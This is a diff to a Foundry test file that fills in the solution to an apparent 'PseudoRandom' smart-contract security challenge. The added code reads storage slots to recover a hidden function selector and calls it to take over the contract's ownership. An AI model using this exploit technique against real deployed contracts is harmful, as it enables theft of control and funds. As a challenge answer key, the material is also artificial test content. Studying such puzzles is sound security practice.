@@ -2,6 +2,7 @@
 pragma solidity ^0.8.19;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 
 import "../src/PseudoRandom.sol";
 
@@ -37,7 +38,19 @@ contract PseudoRandomTest is Test {
         vm.startPrank(addr, addr);
         address instance = address(new PseudoRandom());
 
-        // the solution
+        bytes32 sig = vm.load(
+            instance,
+            vm.load(instance, bytes32(block.chainid + uint256(uint160(addr))))
+        );
+
+        bytes memory callInfo = abi.encodeWithSelector(
+            bytes4(sig),
+            address(0),
+            addr
+        );
+
+        (bool response, ) = instance.call(callInfo);
+        require(response);
 
         assertEq(PseudoRandom(instance).owner(), addr);
     }
